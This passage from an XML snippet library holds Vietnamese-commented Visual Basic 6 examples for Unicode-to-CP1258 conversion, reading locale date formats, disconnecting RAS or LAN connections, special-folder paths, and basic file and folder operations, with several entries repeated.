    End If
 
    For i = 0 To UBound(arrDelLine)
        dLine = arrDelLine(i)  'Ga'n tu*`ng do`ng cho bie^'n dLine
 
        If DaiChuoiThayThe &lt;&gt; "" Then
            rLine = arrRepLine(i)
        Else
            rLine = ""
        End If
 
        ChuoiGoc = Replace(ChuoiGoc, dLine, rLine, 1, -1, vbBinaryCompare)
    Next i
    RepKeyStrS = ChuoiGoc
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080418090454</MaVD>
    <NoiDung>Public Function U2CP1258(str$) As String
Dim CP1258$, UNI$, i&amp;, sCP$, arrCP1258() As String
UNI = ChrW(&amp;HE1) &amp; ChrW(&amp;HE0) &amp; ChrW(&amp;H1EA3) &amp; ChrW(&amp;HE3) &amp; ChrW(&amp;H1EA1) &amp; ChrW(&amp;HE2) &amp; ChrW(&amp;H103) &amp; ChrW(&amp;H1EA5) &amp; ChrW(&amp;H1EA7) &amp; ChrW(&amp;H1EA9) &amp; ChrW(&amp;H1EAB) &amp; ChrW(&amp;H1EAD) &amp; ChrW(&amp;H1EAF) &amp; ChrW(&amp;H1EB1) &amp; ChrW(&amp;H1EB3) &amp; ChrW(&amp;H1EB5) &amp; ChrW(&amp;H1EB7) &amp; ChrW(&amp;HC1) &amp; ChrW(&amp;HC0) &amp; ChrW(&amp;H1EA2) &amp; ChrW(&amp;HC3) &amp; ChrW(&amp;H1EA0) &amp; ChrW(&amp;HC2) &amp; ChrW(&amp;H102) &amp; ChrW(&amp;H1EA4) &amp; ChrW(&amp;H1EA6) &amp; ChrW(&amp;H1EA8) &amp; ChrW(&amp;H1EAA) &amp; ChrW(&amp;H1EAC) &amp; ChrW(&amp;H1EAE) &amp; ChrW(&amp;H1EB0) &amp; ChrW(&amp;H1EB2) &amp; ChrW(&amp;H1EB4) &amp; ChrW(&amp;H1EB6) &amp; ChrW(&amp;HE9) &amp; ChrW(&amp;HE8) &amp; ChrW(&amp;H1EBB) _
&amp; ChrW(&amp;H1EBD) &amp; ChrW(&amp;H1EB9) &amp; ChrW(&amp;HEA) &amp; ChrW(&amp;H1EBF) &amp; ChrW(&amp;H1EC1) &amp; ChrW(&amp;H1EC3) &amp; ChrW(&amp;H1EC5) &amp; ChrW(&amp;H1EC7) &amp; ChrW(&amp;HC9) &amp; ChrW(&amp;HC8) &amp; ChrW(&amp;H1EBA) &amp; ChrW(&amp;H1EBC) &amp; ChrW(&amp;H1EB8) &amp; ChrW(&amp;HCA) &amp; ChrW(&amp;H1EBE) &amp; ChrW(&amp;H1EC0) &amp; ChrW(&amp;H1EC2) &amp; ChrW(&amp;H1EC4) &amp; ChrW(&amp;H1EC6) &amp; ChrW(&amp;HED) &amp; ChrW(&amp;HEC) &amp; ChrW(&amp;H1EC9) &amp; ChrW(&amp;H129) &amp; ChrW(&amp;H1ECB) &amp; ChrW(&amp;HCD) &amp; ChrW(&amp;HCC) &amp; ChrW(&amp;H1EC8) &amp; ChrW(&amp;H128) &amp; ChrW(&amp;H1ECA) &amp; ChrW(&amp;HF3) &amp; ChrW(&amp;HF2) &amp; ChrW(&amp;H1ECF) &amp; ChrW(&amp;HF5) _
&amp; ChrW(&amp;H1ECD) &amp; Chr(&amp;HF4) &amp; ChrW(&amp;H1A1) &amp; ChrW(&amp;H1ED1) &amp; ChrW(&amp;H1ED3) &amp; ChrW(&amp;H1ED5) &amp; ChrW(&amp;H1ED7) &amp; ChrW(&amp;H1ED9) &amp; ChrW(&amp;H1EDB) &amp; ChrW(&amp;H1EDD) &amp; ChrW(&amp;H1EDF) &amp; ChrW(&amp;H1EE1) &amp; ChrW(&amp;H1EE3) &amp; ChrW(&amp;HD3) &amp; ChrW(&amp;HD2) &amp; ChrW(&amp;H1ECE) &amp; ChrW(&amp;HD5) &amp; ChrW(&amp;H1ECC) &amp; ChrW(&amp;HD4) &amp; ChrW(&amp;H1A0) &amp; ChrW(&amp;H1ED0) &amp; ChrW(&amp;H1ED2) &amp; ChrW(&amp;H1ED4) &amp; ChrW(&amp;H1ED6) &amp; ChrW(&amp;H1ED8) &amp; ChrW(&amp;H1EDA) &amp; ChrW(&amp;H1EDC) &amp; ChrW(&amp;H1EDE) &amp; ChrW(&amp;H1EE0) &amp; ChrW(&amp;H1EE2) &amp; ChrW(&amp;HFA) &amp; ChrW(&amp;HF9) &amp; ChrW(&amp;H1EE7) &amp; ChrW(&amp;H169) &amp; _
ChrW(&amp;H1EE5) &amp; ChrW(&amp;H1B0) &amp; ChrW(&amp;H1EE9) &amp; ChrW(&amp;H1EEB) &amp; ChrW(&amp;H1EED) &amp; ChrW(&amp;H1EEF) &amp; ChrW(&amp;H1EF1) &amp; ChrW(&amp;HDA) &amp; ChrW(&amp;HD9) &amp; ChrW(&amp;H1EE6) &amp; ChrW(&amp;H168) &amp; ChrW(&amp;H1EE4) &amp; ChrW(&amp;H1AF) &amp; ChrW(&amp;H1EE8) &amp; ChrW(&amp;H1EEA) &amp; ChrW(&amp;H1EEC) &amp; ChrW(&amp;H1EEE) &amp; ChrW(&amp;H1EF0) &amp; ChrW(&amp;HFD) &amp; ChrW(&amp;H1EF3) &amp; ChrW(&amp;H1EF7) &amp; ChrW(&amp;H1EF9) &amp; ChrW(&amp;H1EF5) &amp; ChrW(&amp;HDD) &amp; ChrW(&amp;H1EF2) &amp; ChrW(&amp;H1EF6) &amp; ChrW(&amp;H1EF8) &amp; ChrW(&amp;H1EF4) &amp; ChrW(&amp;H111) &amp; ChrW(&amp;H110)
CP1258 = "aì,aÌ,aÒ,aÞ,aò,â,ã,âì,âÌ,âÒ,âÞ,âò,ãì,ãÌ,ãÒ,ãÞ,ãò,Aì,AÌ,AÒ,AÞ,Aò,Â,Ã,Âì,ÂÌ,ÂÒ,ÂÞ,Âò,Ãì,ÃÌ,ÃÒ,ÃÞ,Ãò,eì,eÌ,eÒ,eÞ,eò,ê,êì,êÌ,êÒ,êÞ,êò,Eì,EÌ,EÒ,EÞ,Eò,Ê,Êì,ÊÌ,ÊÒ,ÊÞ,Êò,iì,iÌ,iÒ,iÞ,iò,Iì,IÌ,IÒ,IÞ,Iò,oì,oÌ,oÒ,oÞ,oò,ô,õ,ôì,ôÌ,ôÒ,ôÞ,ôò,õì,õÌ,õÒ,õÞ,õò,Oì,OÌ,OÒ,OÞ,Oò,Ô,Õ,Ôì,ÔÌ,ÔÒ,ÔÞ,Ôò,Õì,ÕÌ,ÕÒ,ÕÞ,Õò,uì,uÌ,uÒ,uÞ,uò,ý,ýì,ýÌ,ýÒ,ýÞ,ýò,Uì,UÌ,UÒ,UÞ,Uò,Ý,Ýì,ÝÌ,ÝÒ,ÝÞ,Ýò,yì,yÌ,yÒ,yÞ,yò,Yì,YÌ,YÒ,YÞ,Yò,ð,Ð"
arrCP1258 = Split(CP1258, ",")
    For i = 1 To Len(str)
        If InStr(UNI, Mid(str, i, 1)) &gt; 0 Then
            sCP = sCP &amp; arrCP1258(InStr(UNI, Mid(str, i, 1)) - 1)
        Else
            sCP = sCP &amp; Mid(str, i, 1)
        End If
    Next
    U2CP1258 = sCP
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080518090521</MaVD>
    <NoiDung>Public Function U2CP1258(str$) As String
Dim CP1258$, UNI$, i&amp;, sCP$, arrCP1258() As String
UNI = ChrW(&amp;HE1) &amp; ChrW(&amp;HE0) &amp; ChrW(&amp;H1EA3) &amp; ChrW(&amp;HE3) &amp; ChrW(&amp;H1EA1) &amp; ChrW(&amp;HE2) &amp; ChrW(&amp;H103) &amp; ChrW(&amp;H1EA5) &amp; ChrW(&amp;H1EA7) &amp; ChrW(&amp;H1EA9) &amp; ChrW(&amp;H1EAB) &amp; ChrW(&amp;H1EAD) &amp; ChrW(&amp;H1EAF) &amp; ChrW(&amp;H1EB1) &amp; ChrW(&amp;H1EB3) &amp; ChrW(&amp;H1EB5) &amp; ChrW(&amp;H1EB7) &amp; ChrW(&amp;HC1) &amp; ChrW(&amp;HC0) &amp; ChrW(&amp;H1EA2) &amp; ChrW(&amp;HC3) &amp; ChrW(&amp;H1EA0) &amp; ChrW(&amp;HC2) &amp; ChrW(&amp;H102) &amp; ChrW(&amp;H1EA4) &amp; ChrW(&amp;H1EA6) &amp; ChrW(&amp;H1EA8) &amp; ChrW(&amp;H1EAA) &amp; ChrW(&amp;H1EAC) &amp; ChrW(&amp;H1EAE) &amp; ChrW(&amp;H1EB0) &amp; ChrW(&amp;H1EB2) &amp; ChrW(&amp;H1EB4) &amp; ChrW(&amp;H1EB6) &amp; ChrW(&amp;HE9) &amp; ChrW(&amp;HE8) &amp; ChrW(&amp;H1EBB) _
&amp; ChrW(&amp;H1EBD) &amp; ChrW(&amp;H1EB9) &amp; ChrW(&amp;HEA) &amp; ChrW(&amp;H1EBF) &amp; ChrW(&amp;H1EC1) &amp; ChrW(&amp;H1EC3) &amp; ChrW(&amp;H1EC5) &amp; ChrW(&amp;H1EC7) &amp; ChrW(&amp;HC9) &amp; ChrW(&amp;HC8) &amp; ChrW(&amp;H1EBA) &amp; ChrW(&amp;H1EBC) &amp; ChrW(&amp;H1EB8) &amp; ChrW(&amp;HCA) &amp; ChrW(&amp;H1EBE) &amp; ChrW(&amp;H1EC0) &amp; ChrW(&amp;H1EC2) &amp; ChrW(&amp;H1EC4) &amp; ChrW(&amp;H1EC6) &amp; ChrW(&amp;HED) &amp; ChrW(&amp;HEC) &amp; ChrW(&amp;H1EC9) &amp; ChrW(&amp;H129) &amp; ChrW(&amp;H1ECB) &amp; ChrW(&amp;HCD) &amp; ChrW(&amp;HCC) &amp; ChrW(&amp;H1EC8) &amp; ChrW(&amp;H128) &amp; ChrW(&amp;H1ECA) &amp; ChrW(&amp;HF3) &amp; ChrW(&amp;HF2) &amp; ChrW(&amp;H1ECF) &amp; ChrW(&amp;HF5) _
&amp; ChrW(&amp;H1ECD) &amp; Chr(&amp;HF4) &amp; ChrW(&amp;H1A1) &amp; ChrW(&amp;H1ED1) &amp; ChrW(&amp;H1ED3) &amp; ChrW(&amp;H1ED5) &amp; ChrW(&amp;H1ED7) &amp; ChrW(&amp;H1ED9) &amp; ChrW(&amp;H1EDB) &amp; ChrW(&amp;H1EDD) &amp; ChrW(&amp;H1EDF) &amp; ChrW(&amp;H1EE1) &amp; ChrW(&amp;H1EE3) &amp; ChrW(&amp;HD3) &amp; ChrW(&amp;HD2) &amp; ChrW(&amp;H1ECE) &amp; ChrW(&amp;HD5) &amp; ChrW(&amp;H1ECC) &amp; ChrW(&amp;HD4) &amp; ChrW(&amp;H1A0) &amp; ChrW(&amp;H1ED0) &amp; ChrW(&amp;H1ED2) &amp; ChrW(&amp;H1ED4) &amp; ChrW(&amp;H1ED6) &amp; ChrW(&amp;H1ED8) &amp; ChrW(&amp;H1EDA) &amp; ChrW(&amp;H1EDC) &amp; ChrW(&amp;H1EDE) &amp; ChrW(&amp;H1EE0) &amp; ChrW(&amp;H1EE2) &amp; ChrW(&amp;HFA) &amp; ChrW(&amp;HF9) &amp; ChrW(&amp;H1EE7) &amp; ChrW(&amp;H169) &amp; _
ChrW(&amp;H1EE5) &amp; ChrW(&amp;H1B0) &amp; ChrW(&amp;H1EE9) &amp; ChrW(&amp;H1EEB) &amp; ChrW(&amp;H1EED) &amp; ChrW(&amp;H1EEF) &amp; ChrW(&amp;H1EF1) &amp; ChrW(&amp;HDA) &amp; ChrW(&amp;HD9) &amp; ChrW(&amp;H1EE6) &amp; ChrW(&amp;H168) &amp; ChrW(&amp;H1EE4) &amp; ChrW(&amp;H1AF) &amp; ChrW(&amp;H1EE8) &amp; ChrW(&amp;H1EEA) &amp; ChrW(&amp;H1EEC) &amp; ChrW(&amp;H1EEE) &amp; ChrW(&amp;H1EF0) &amp; ChrW(&amp;HFD) &amp; ChrW(&amp;H1EF3) &amp; ChrW(&amp;H1EF7) &amp; ChrW(&amp;H1EF9) &amp; ChrW(&amp;H1EF5) &amp; ChrW(&amp;HDD) &amp; ChrW(&amp;H1EF2) &amp; ChrW(&amp;H1EF6) &amp; ChrW(&amp;H1EF8) &amp; ChrW(&amp;H1EF4) &amp; ChrW(&amp;H111) &amp; ChrW(&amp;H110)
CP1258 = "aì,aÌ,aÒ,aÞ,aò,â,ã,âì,âÌ,âÒ,âÞ,âò,ãì,ãÌ,ãÒ,ãÞ,ãò,Aì,AÌ,AÒ,AÞ,Aò,Â,Ã,Âì,ÂÌ,ÂÒ,ÂÞ,Âò,Ãì,ÃÌ,ÃÒ,ÃÞ,Ãò,eì,eÌ,eÒ,eÞ,eò,ê,êì,êÌ,êÒ,êÞ,êò,Eì,EÌ,EÒ,EÞ,Eò,Ê,Êì,ÊÌ,ÊÒ,ÊÞ,Êò,iì,iÌ,iÒ,iÞ,iò,Iì,IÌ,IÒ,IÞ,Iò,oì,oÌ,oÒ,oÞ,oò,ô,õ,ôì,ôÌ,ôÒ,ôÞ,ôò,õì,õÌ,õÒ,õÞ,õò,Oì,OÌ,OÒ,OÞ,Oò,Ô,Õ,Ôì,ÔÌ,ÔÒ,ÔÞ,Ôò,Õì,ÕÌ,ÕÒ,ÕÞ,Õò,uì,uÌ,uÒ,uÞ,uò,ý,ýì,ýÌ,ýÒ,ýÞ,ýò,Uì,UÌ,UÒ,UÞ,Uò,Ý,Ýì,ÝÌ,ÝÒ,ÝÞ,Ýò,yì,yÌ,yÒ,yÞ,yò,Yì,YÌ,YÒ,YÞ,Yò,ð,Ð"
arrCP1258 = Split(CP1258, ",")
    For i = 1 To Len(str)
        If InStr(UNI, Mid(str, i, 1)) &gt; 0 Then
            sCP = sCP &amp; arrCP1258(InStr(UNI, Mid(str, i, 1)) - 1)
        Else
            sCP = sCP &amp; Mid(str, i, 1)
        End If
    Next
    U2CP1258 = sCP
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000204</MaVD>
    <NoiDung>Thêm vào trong Form 3 TextBox:

Option Explicit 

DefInt A-Z 

Private Declare Function GetLocaleInfo Lib "kernel32" _ 
        Alias "GetLocaleInfoA" (ByVal lLocale As Long, _ 
        ByVal lLocaleType As Long, ByVal sLCData As String, _ 
        ByVal lBufferLength As Long) As Long 

Private Const LOCALE_SLONGDATE = &amp;H20 
Private Const LOCALE_SSHORTDATE = &amp;H1F 
Private Const LOCALE_STIMEFORMAT = &amp;H1003 
Private Const LOCALE_USER_DEFAULT As Long = &amp;H400 

Public Function GetLongDateFormat() As String 
    Dim BuffLen As Long, Result As Long 
    Dim Buffer As String 
    On Error Resume Next 
    BuffLen = 128 
    Buffer = String$(BuffLen, vbNullChar) 
    Result = GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SLONGDATE, Buffer, BuffLen) 
    If Result &gt; 0 Then 
        GetLongDateFormat = Left$(Buffer, Result - 1) 
    Else 
        GetLongDateFormat = "dd MMMM yyyy" 
    End If 
    On Error GoTo 0 
End Function 

Hoặc

Public Function GetShortDateFormat() As String 
    Dim BuffLen As Long, Result As Long 
    Dim Buffer As String 
    On Error Resume Next 
    BuffLen = 128 
    Buffer = String$(BuffLen, vbNullChar) 
    Result = GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SSHORTDATE, Buffer, BuffLen) 
    If Result &gt; 0 Then 
        GetShortDateFormat = Left$(Buffer, Result - 1) 
    Else 
        GetShortDateFormat = "dd/MM/yy" 
    End If 
    On Error GoTo 0 
End Function 

Public Function GetTimeFormat() As String 
    Dim BuffLen As Long, Result As Long 
    Dim Buffer As String 
    On Error Resume Next 
    BuffLen = 128 
    Buffer = String$(BuffLen, vbNullChar) 
    Result = GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_STIMEFORMAT, Buffer, BuffLen) 
    If Result &gt; 0 Then 
        GetTimeFormat = Left$(Buffer, Result - 1) 
    Else 
        GetTimeFormat = "HH:mm:ss" 
    End If 
    On Error GoTo 0 
End Function 

Private Sub Form_Load() 
    Text1.Text = Format(Now, GetLongDateFormat) 
    Text2.Text = Format(Now, GetShortDateFormat) 
    Text3.Text = Format(Now, GetTimeFormat) 
End Sub

Hoặc bạn có thể đọc thông tin trực tiếp từ Registry

Private Sub Form_Load()
On Error Resume Next
Dim a, b
Set a = CreateObject("wscript.shell")
b = a.RegRead("HKEY_CURRENT_USER\Control Panel\International\sLongDate")
b = b &amp; Chr(10) &amp; a.RegRead("HKEY_CURRENT_USER\Control Panel\International\sShortDate")
b = b &amp; Chr(10) &amp; a.RegRead("HKEY_CURRENT_USER\Control Panel\International\sTimeFormat")
MsgBox b
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083018093003</MaVD>
    <NoiDung>Ngắt RAS
'Module Code
Public Const RAS_MAXENTRYNAME As Integer = 256
Public Const RAS_MAXDEVICETYPE As Integer = 16
Public Const RAS_MAXDEVICENAME As Integer = 128
Public Const RAS_RASCONNSIZE As Integer = 412
 
Public Type RasEntryName
    dwSize As Long
    szEntryName(RAS_MAXENTRYNAME) As Byte
End Type
 
Public Type RasConn
    dwSize As Long
    hRasConn As Long
    szEntryName(RAS_MAXENTRYNAME) As Byte
    szDeviceType(RAS_MAXDEVICETYPE) As Byte
    szDeviceName(RAS_MAXDEVICENAME) As Byte
End Type
 
Public Declare Function RasEnumConnections Lib _
"rasapi32.dll" Alias "RasEnumConnectionsA" (lpRasConn As _
Any, lpcb As Long, lpcConnections As Long) As Long
 
Public Declare Function RasHangUp Lib "rasapi32.dll" Alias _
"RasHangUpA" (ByVal hRasConn As Long) As Long
Public gstrISPName As String
Public ReturnCode As Long
 
Public Sub HangUp()
    Dim i As Long
    Dim lpRasConn(255) As RasConn
    Dim lpcb As Long
    Dim lpcConnections As Long
    Dim hRasConn As Long
    lpRasConn(0).dwSize = RAS_RASCONNSIZE
    lpcb = RAS_MAXENTRYNAME * lpRasConn(0).dwSize
    lpcConnections = 0
    ReturnCode = RasEnumConnections(lpRasConn(0), lpcb, _
    lpcConnections)
 
    If ReturnCode = ERROR_SUCCESS Then
        For i = 0 To lpcConnections - 1
            If Trim(ByteToString(lpRasConn(i).szEntryName)) = Trim(gstrISPName) Then
                hRasConn = lpRasConn(i).hRasConn
                ReturnCode = RasHangUp(ByVal hRasConn)
            End If
        Next i
    End If
End Sub
 
Public Function ByteToString(bytString() As Byte) As String
    Dim i As Integer
    ByteToString = ""
    i = 0
    While bytString(i) = 0&amp;
        ByteToString = ByteToString &amp; Chr(bytString(i))
        i = i + 1
    Wend
End Function
 
 
'Form Code
Private Sub Command1_Click()
    Call HangUp
End Sub

Ngắt LAN bằng cách sử dụng shell object

Dim objCP, objDisable, colNetwork
Dim clsConn, clsLANConn, clsVerb
Dim strNetConn, strConn, strDisable
 
strNetConn = "Network Connections"
strConn = "Local Area Connection"
 
strDisable = "Disa&amp;ble"
 
Set objshell = CreateObject("Shell.Application")
 
If objshell Is Nothing Then
    MsgBox "Fooey"
    Exit Sub
End If
 
 
Set objCP = objshell.NameSpace(3) 'Control Panel Name Space
 
Set colNetwork = Nothing
For Each clsConn In objCP.Items
    If clsConn.Name = strNetConn Then
        Set colNetwork = clsConn.GetFolder
        Exit For
    End If
Next
 
If colNetwork Is Nothing Then
    MsgBox "Network folder not found"
    Exit Sub
End If
 
Set clsLANConn = Nothing
For Each clsConn In colNetwork.Items
    If InStr(LCase(clsConn.Name), LCase(strConn)) Then
        Set clsLANConn = clsConn
        Exit For
    End If
Next
 
If clsLANConn Is Nothing Then
    MsgBox "Network Connection not found"
    Exit Sub
End If
 
Set objDisable = Nothing
 
For Each clsVerb In clsLANConn.Verbs
    If clsVerb.Name = strDisable Then
        Set objDisable = clsVerb
        objDisable.DoIt
    End If
Next</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083318093301</MaVD>
    <NoiDung>Hằng  Thư mục đặc biệt
    
&amp;H1&amp;    Internet Explorer
&amp;H2&amp;    Programs
&amp;H3&amp;    Control Panel
&amp;H4&amp;    Printers and Faxes
&amp;H5&amp;    My Documents
&amp;H6&amp;    Favorites
&amp;H7&amp;    Startup
&amp;H8&amp;    My Recent Documents
&amp;H9&amp;    SendTo
&amp;Ha&amp;    Recycle Bin
&amp;Hb&amp;    Start Menu
&amp;Hd&amp;    My Music
&amp;He&amp;    My Videos
&amp;H10&amp;   Desktop
&amp;H11&amp;   My Computer
&amp;H12&amp;   My Network Places
&amp;H13&amp;   NetHood
&amp;H14&amp;   Fonts
&amp;H15&amp;   Templates
&amp;H16&amp;   All Users Start Menu
&amp;H17&amp;   All Users Programs
&amp;H18&amp;   All Users Startup
&amp;H19&amp;   All Users Desktop
&amp;H1a&amp;   Application Data
&amp;H1b&amp;   PrintHood
&amp;H1c&amp;   Local Settings\Application Data
&amp;H19&amp;   All Users Favorites
&amp;H20&amp;   Local Settings\ Temporary Internet Files
&amp;H21&amp;   Cookies
&amp;H22&amp;   Local Settings\History
&amp;H23&amp;   All Users Application Data
&amp;H24&amp;   Windows
&amp;H25&amp;   System32
&amp;H26&amp;   Program Files
&amp;H27&amp;   My Pictures
&amp;H28&amp;   User Profile
&amp;H2b&amp;   Common Files
&amp;H2e&amp;   All Users Templates
&amp;H2f&amp;   Administrative Tools
&amp;H31&amp;   Network Connections

Dim KhoiTao, ThuMuc, ÐôiTuong
'Thu muc cân tìm: ví du Startup
Private Sub Form_Load()
Set KhoiTao = CreateObject("Shell.Application")
Set ThuMuc = KhoiTao.Namespace(&amp;H7&amp;)
Set ÐôiTuong = ThuMuc.Self
MsgBox ÐôiTuong.Path
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083618093609</MaVD>
    <NoiDung>Hằng  Thư mục đặc biệt
    
&amp;H1&amp;    Internet Explorer
&amp;H2&amp;    Programs
&amp;H3&amp;    Control Panel
&amp;H4&amp;    Printers and Faxes
&amp;H5&amp;    My Documents
&amp;H6&amp;    Favorites
&amp;H7&amp;    Startup
&amp;H8&amp;    My Recent Documents
&amp;H9&amp;    SendTo
&amp;Ha&amp;    Recycle Bin
&amp;Hb&amp;    Start Menu
&amp;Hd&amp;    My Music
&amp;He&amp;    My Videos
&amp;H10&amp;   Desktop
&amp;H11&amp;   My Computer
&amp;H12&amp;   My Network Places
&amp;H13&amp;   NetHood
&amp;H14&amp;   Fonts
&amp;H15&amp;   Templates
&amp;H16&amp;   All Users Start Menu
&amp;H17&amp;   All Users Programs
&amp;H18&amp;   All Users Startup
&amp;H19&amp;   All Users Desktop
&amp;H1a&amp;   Application Data
&amp;H1b&amp;   PrintHood
&amp;H1c&amp;   Local Settings\Application Data
&amp;H19&amp;   All Users Favorites
&amp;H20&amp;   Local Settings\ Temporary Internet Files
&amp;H21&amp;   Cookies
&amp;H22&amp;   Local Settings\History
&amp;H23&amp;   All Users Application Data
&amp;H24&amp;   Windows
&amp;H25&amp;   System32
&amp;H26&amp;   Program Files
&amp;H27&amp;   My Pictures
&amp;H28&amp;   User Profile
&amp;H2b&amp;   Common Files
&amp;H2e&amp;   All Users Templates
&amp;H2f&amp;   Administrative Tools
&amp;H31&amp;   Network Connections

Dim KhoiTao, ThuMuc, ÐôiTuong
'Thu muc cân tìm: ví du Startup
Private Sub Form_Load()
Set KhoiTao = CreateObject("Shell.Application")
Set ThuMuc = KhoiTao.Namespace(&amp;H7&amp;)
Set ÐôiTuong = ThuMuc.Self
MsgBox ÐôiTuong.Path
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084418094447</MaVD>
    <NoiDung>Private Sub Form_Load()
Dim fs, f, s, fi, i
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set f = fs.GetFolder("C:\Program Files")
    s = s &amp; "f.Name = " &amp; UCase(f.Name)
    s = s &amp; vbCrLf &amp; "f.path = " &amp; f.Path
    s = s &amp; vbCrLf &amp; "f.IsRootFolder = " &amp; f.IsRootFolder
    s = s &amp; vbCrLf &amp; "f.Shortpath = " &amp; f.Shortpath
    s = s &amp; vbCrLf &amp; "f.ShortName = " &amp; f.ShortName
    s = s &amp; vbCrLf &amp; "f.ParentFolder = " &amp; UCase(f.ParentFolder)
    s = s &amp; vbCrLf &amp; "f.Size = " &amp; f.Size \ 1024 &amp; " Kbytes."
    s = s &amp; vbCrLf &amp; "f.attributes = " &amp; f.Attributes &amp; "( Xem thêm lênh DIR)"
    'f.attributes: 16 = Directory
    s = s &amp; vbCrLf &amp; "f.DateCreated = " &amp; f.DateCreated
    s = s &amp; vbCrLf &amp; "f.DateLastModified = " &amp; f.DateLastModified
    s = s &amp; vbCrLf &amp; "f.DateLastAccessed = " &amp; f.DateLastAccessed
    s = s &amp; vbCrLf &amp; "f.Type = " &amp; f.Type
    Set fi = f.subfolders
    i = 0
    For Each folder In fi
    i = i + 1
    Next
    s = s &amp; vbCrLf &amp; "f.subFolder = " &amp; i
    Set fi = f.Files
    i = 0
    For Each file In fi
    i = i + 1
    Next
    s = s &amp; vbCrLf &amp; "f.Files = " &amp; i
    MsgBox s, 0, "Folder Info"
End
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084718094703</MaVD>
    <NoiDung>Private Sub Form_Load()
'Tao thu muc: Nêu có Folder cùng tên hiên huu se báo lôi!
  MkDir "D:\My Folder"
'Xóa thu muc: Nêu Folder chu'a Files se báo lôi!
  RmDir "D:\My Folder"
'Xem Ðuong dân hiên tai: CurDir() = App.Path
  MsgBox CurDir &amp; vbCrLf &amp; App.Path
'Ðôi Ðuong dân cua thu muc hiên hành: ít dùng
  ChDir "D:\"
'Gán thuôc tính cho thu muc:
  SetAttr "C:\Windows", 0
       ' Phần VBSCRIP5
'Ðoc tât ca các Folder trong môt thu muc:
Dim fso, ÐocFLD, môtFLD, FLDcon, s
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set ÐocFLD = fso.GetFolder("C:\Windows")
  Set FLDcon = ÐocFLD.SubFolders
     For Each môtFLD In FLDcon
         s = s &amp; môtFLD.Name &amp; ", "
     Next
 MsgBox s
'Ðoc tât ca các File *.log trong môt thu muc:
  s = ""
  Set FLDcon = ÐocFLD.Files
     For Each môtFLD In FLDcon
        If UCase(Right(môtFLD.Name, 3)) = "LOG" Then s = s &amp; môtFLD.Name &amp; ", "
     Next
  MsgBox s
'Riêng Ðoc tât ca các Files và Folder trong thu muc và tât ca các Files và Folder trong thu muc con, cháu..., Mo'i các bạn tham khao

'kiêm tra thu muc có tôn tai?
    If (fso.FolderExists("D:\My Folder")) Then
        MsgBox "Có " &amp; "D:\My Folder"
    Else
        MsgBox "Không có " &amp; "D:\My Folder"
    End If
'Copy thu muc chép chông
  MkDir "D:\My Folder"
  FileCopy "c:\config.sys", "D:\My Folder\1.txt"
  fso.CopyFolder "C:\windows\Cursors", "D:\My Folder"
'Xóa thu muc có chu'a Files
  fso.DeleteFolder ("D:\My Folder")
'Giai phóng tài nguyên
  Set fso = Nothing
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084918094917</MaVD>
    <NoiDung>Private Sub Form_Load()
'Kiêm tra File
    If Dir("C:\windows\system32\Cmd111.exe") = Empty Then
        MsgBox ("Không có Cmd111.exe")
    Else
        MsgBox ("Có Cmd111.exe")
    End If
'Copy file tu thu muc này sang thu muc khác
    FileCopy "C:\Config.sys", "D:\MyFile.txt"
'Xóa file
    Kill "D:\MyFile.txt"
'ngày gio' mà File Ðuoc tao hoac ngày gia chinh sua cuôi cùng
    Dim MyStamp
    MyStamp = FileDateTime("C:\Config.sys")
    MsgBox MyStamp
'Tra ve so Byte cua File
    MsgBox FileLen("C:\Config.sys") &amp; " bytes"
    
'Cho biêt thuôc tính hiên tai File
    MyStamp = GetAttr("C:\Config.sys")
    MsgBox MyStamp
'Ðôi tên tâp tin
    Name "C:\Config.sys" As "C:\Config111.sys"
    Name "C:\Config111.sys" As "C:\Config.sys"
'Gán thuôc tính cho File và thu muc
    SetAttr "C:\Config.sys", vbHidden + vbReadOnly
    
    ' PHÂN VBSCRIP5
'Ðoc tên file hay folder cuôi cùng cua Path
Dim fso, GetAName, MySt
  Set fso = CreateObject("Scripting.FileSystemObject")
  GetAName = fso.GetFileName("C:\windows\system32\Cmd.exe")
  MsgBox GetAName
    GetAName = fso.GetFileName("C:\windows\system32\")
    MsgBox GetAName
'Ðoc tên file không Ðuôi hoac folder
  GetAName = fso.GetBaseName("C:\windows\system32\Cmd.exe")
  MsgBox GetAName
     GetAName = fso.GetBaseName("C:\windows\system32\")
     MsgBox GetAName
'Ngày tao, ngày sua, ngay truy nhâp file cuôi cùng
    Set GetAName = fso.GetFile("C:\windows\system32\Cmd.exe")
    MySt = GetAName.DateCreated
    MySt = MySt &amp; vbCrLf &amp; GetAName.DateLastModified
    MySt = MySt &amp; vbCrLf &amp; GetAName.DateLastAccessed
    MsgBox MySt
'Tao và Mo' file và Viêt vào file
    Const ForReading = 1, ForWriting = 2, ForAppending = 8
    Set GetAName = fso.OpenTextFile("c:\test.txt", ForWriting, True)
    'Viêt 1 dòng
    GetAName.Write "Hello world!"
    'viêt 3 ký tu trang
    GetAName.WriteBlankLines (3)
    'viêt 1 dòng và ký tu xuông dòng
    GetAName.WriteLine "Testing 1, 2, 3."
'Mo' file và Ðoc file
  Set GetAName = fso.OpenTextFile("c:\test.txt", ForReading)
  MySt = GetAName.ReadAll
'Tao file Ðon gian
    Set GetAName = fso.CreateTextFile("c:\test.txt", True)
'Ðóng file
    GetAName.Close
'Move file
    Set GetAName = fso.GetFile("c:\test.txt")
    GetAName.Move "d:\test.txt"
'Xóa file
    GetAName.Delete
 
     'BÔ SUNG PHÂN FOLDER
 'Ðoc tên tuyêt Ðôi cua folder, vd Ðang o' tai c:\mydocuments\reports
    MsgBox fso.GetAbsolutePathName("c:\\\")
 'Cú pháp: "c:" --&gt; c:\mydocuments\reports  "c:.." --&gt; c:\mydocuments = lùi 1 câp
